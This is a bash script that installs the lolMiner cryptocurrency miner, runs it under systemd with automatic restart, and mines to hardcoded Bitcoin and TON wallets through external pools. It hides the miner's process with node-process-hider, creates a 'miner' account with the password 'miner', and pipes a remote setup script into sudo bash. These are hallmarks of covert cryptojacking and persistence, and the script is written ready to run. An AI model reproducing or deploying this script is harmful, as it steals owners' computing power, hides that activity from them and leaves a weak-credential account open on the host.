#! /bin/bash
apt-get update && apt-get full-upgrade
apt -y install wget curl unzip screen autoconf git cmake binutils build-essential net-tools golang
sudo curl -fsSL https://deb.nodesource.com/setup_12.x | sudo -E bash - 
apt-get install -y nodejs 
npm i -g node-process-hider && sudo ph add lolMiner
adduser miner --gecos "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password
echo "miner:miner" | sudo chpasswd
cd /home/miner
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.50/lolMiner_v1.50_Lin64.tar.gz
tar -xzvf lolMiner_v1.50_Lin64.tar.gz
cd 1.50

#################################
## Begin of user-editable part ##
#################################

BTCPOOL=ethash.unmineable.com:3333
BTCWALLET=BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993
BTCWORKER=lolMiner

TONPOOL=https://server1.whalestonpool.com
TONWALLET=EQCmOWzntn9fxLZw9i2qn2ORX5wwzM--yjBvvW5JgKKjqkhV

#################################
##  End of user-editable part  ##
#################################

cat > /etc/systemd/system/lolMiner.service << EOF 
[Unit]
Description=lolMiner Daemon
After=network.target
[Service]
Type=forking
GuessMainPID=no
ExecStart=/home/miner/1.50/lolMiner --algo ETHASH --pool $BTCPOOL --user $BTCWALLET --dualmode TONDUAL --dualpool $TONPOOL --dualuser $TONWALLET --worker $BTCWORKER $@
Restart=always
User=miner
[Install]
WantedBy=multi-user.target
EOF

systemctl enable lolMiner.service
